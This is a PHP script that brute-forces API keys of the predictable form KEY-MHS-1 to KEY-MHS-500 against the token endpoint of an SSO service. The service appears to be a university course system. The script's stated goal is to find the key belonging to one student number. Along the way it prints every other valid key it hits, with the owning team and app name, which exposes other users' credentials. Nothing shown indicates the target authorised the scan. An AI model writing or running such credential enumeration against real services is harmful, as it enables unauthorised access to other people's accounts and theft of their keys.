<?php

$ssoBaseUrl = 'https://iae-sso.virtualfri.id';
$myNim = '102022400119';

echo "Scanning API keys (1-500) to find key for NIM: $myNim...\n";

// We can run multiple curl requests to speed it up
for ($i = 1; $i <= 500; $i++) {
    $apiKey = sprintf("KEY-MHS-%d", $i);
    
    $ch = curl_init("$ssoBaseUrl/api/v1/auth/token");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
        'api_key' => $apiKey
    ]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Accept: application/json'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode === 200) {
        $data = json_decode($response, true);
        $appName = $data['app']['name'] ?? '';
        $team = $data['app']['team'] ?? '';
        
        echo "Valid Key Found: $apiKey - Team: $team - App Name: $appName\n";
        
        if (strpos($appName, $myNim) !== false || strpos($response, $myNim) !== false) {
            echo "\n🎉 SUCCESS! FOUND YOUR KEY: $apiKey\n";
            echo "Response: $response\n\n";
            break;
        }
    }
}
echo "Scan complete.\n";
